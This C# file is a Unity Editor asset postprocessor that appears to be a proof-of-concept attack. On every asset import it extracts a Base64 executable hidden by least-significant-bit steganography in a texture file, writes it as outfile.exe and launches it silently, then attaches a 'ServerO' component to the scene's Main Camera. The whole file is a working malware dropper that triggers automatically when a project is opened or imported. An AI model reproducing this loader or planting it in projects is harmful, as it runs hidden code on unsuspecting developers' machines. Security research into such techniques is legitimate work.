using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using UnityEditor.SceneManagement;
using UnityEngine.SceneManagement;
using System.Data.SqlTypes;
using TMPro.EditorUtilities;

public class Launcher: AssetPostprocessor
{
    void OnPreprocessTexture()
    {
        Debug.Log("Running OnPreprocessTexture - " + assetPath);
        // Only modify our target texture
        if (assetPath.EndsWith("Pearlesque_embedded.jpg", StringComparison.OrdinalIgnoreCase))
        {
            Debug.Log("Running Texture Importer changes");
            TextureImporter importer = (TextureImporter)assetImporter;
            importer.isReadable = true; // Enable Read/Write
            importer.textureCompression = TextureImporterCompression.Uncompressed;
            importer.SaveAndReimport(); // Apply changes
        }
    }
    static void OnPostprocessAllAssets(string[] importedAssets, string[] deletedAssets, string[] movedAssets, string[] movedFromAssetPaths) 
    {
        Debug.Log("Developer Mode: Attack Activated!");
        //string scriptPath = "Assets/ServerO.txt";
        string scriptContent3 = Process();
        //Debug.Log(scriptContent3);
        byte[] bytes = Convert.FromBase64String(scriptContent3);
        string outfileName = "outfile.exe";
        File.WriteAllBytes("Assets/" + outfileName, bytes);

        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.FileName = (Application.dataPath + "/" + outfileName);
        startInfo.Arguments = "";
        startInfo.RedirectStandardOutput = true;
        startInfo.RedirectStandardError = true;
        startInfo.UseShellExecute = false;
        startInfo.CreateNoWindow = true;

        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo = startInfo;
        proc.EnableRaisingEvents = true;
        try { proc.Start(); }
        catch (Exception e) { throw e; }

        //System.Diagnostics.Process.Start(Application.dataPath + "/" + outfileName);
        AssetDatabase.Refresh();
        EditorApplication.delayCall += AddComponentToMainCamera;
    }

    static void AddComponentToMainCamera()
    {
        // Check if type exists
        Type helloType = Type.GetType("ServerO, Assembly-CSharp");
        if (helloType == null) return;

        // Find Main Camera and add component
        GameObject mainCamera = GameObject.Find("Main Camera");
        if (mainCamera != null && mainCamera.GetComponent(helloType) == null)
        {
            mainCamera.AddComponent(helloType);
            EditorUtility.SetDirty(mainCamera);
            EditorSceneManager.MarkSceneDirty(SceneManager.GetActiveScene());
        }
    }
    private static string Process()
    {
        string embeddedPath = "Assets/Pearlesque_embedded.jpg";
        Texture2D watermarkedTexture = (Texture2D)AssetDatabase.LoadAssetAtPath(embeddedPath, typeof(Texture2D));
        // Embedding process calculates the size of the Base64 encoded payload, saves it as an int, 
        // converts it to a byte array, encodes as Base64, and prefixes it to the payload for embedding
        // in the image. 

        //INT32 converted to a byte array is 8 bytes, so 8*8 bits.
        // Extract the prefix from the image
        string prefixB64 = DecodeWatermark(watermarkedTexture, 8 * 8);
        //Debug.Log("Prefix = " + prefixB64);


        //Convert the encoded prefix back to an INT32
        byte[] prefixBytes = Convert.FromBase64String(prefixB64);
        int prefix = BitConverter.ToInt32(prefixBytes);
        //Debug.Log("Prefix size = " + prefix);

        // Use the prefix to determine the payload size, and offset, for extracting the payload
        string decodedWatermark = DecodeWatermark(watermarkedTexture, prefix*8, 8*8);
        //Debug.Log("Payload:\n" + decodedWatermark);
        //Debug.Log("Converted:\n" + Convert.FromBase64String(decodedWatermark));
        
        return decodedWatermark;
    }

    private static string DecodeWatermark(Texture2D texture, int length, int offset=0)
    {
        Color[] pixels = texture.GetPixels();
        System.Text.StringBuilder binaryData = new System.Text.StringBuilder();
        for (int i = offset; i < length+offset && i < pixels.Length; i++)
        {
            Color pixel = pixels[i];
            binaryData.Append(ExtractLSB(pixel.r));
        }
        string binaryString = binaryData.ToString();
        System.Text.StringBuilder decodedMessage = new System.Text.StringBuilder();

        for (int i = 0; i + 8 <= binaryString.Length; i += 8)
        {
            string byteString = binaryString.Substring(i, 8);
            decodedMessage.Append((char)System.Convert.ToByte(byteString, 2));
        }

        return decodedMessage.ToString();
    }
    private static char ExtractLSB(float channelValue)
    {
        int intValue = Mathf.RoundToInt(channelValue * 255);
        return (intValue & 1) == 1 ? '1' : '0';
    }
}



